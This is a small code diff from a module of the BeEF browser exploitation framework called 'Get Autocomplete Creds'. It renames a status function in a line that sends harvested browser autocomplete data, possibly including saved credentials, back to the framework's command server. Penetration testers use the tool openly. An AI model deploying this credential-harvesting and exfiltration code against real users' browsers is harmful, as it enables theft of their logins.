@@ -23,7 +23,7 @@ beef.execute(function() {
     }
 
     beef.debug("[Get Autocomplete Creds] Found autocomplete data: '" + results + "'");
-    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'results=' + results, beef.are.status_success());
+    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'results=' + results, beef.status.success());
   }
 
   create_form = function(input_name) {
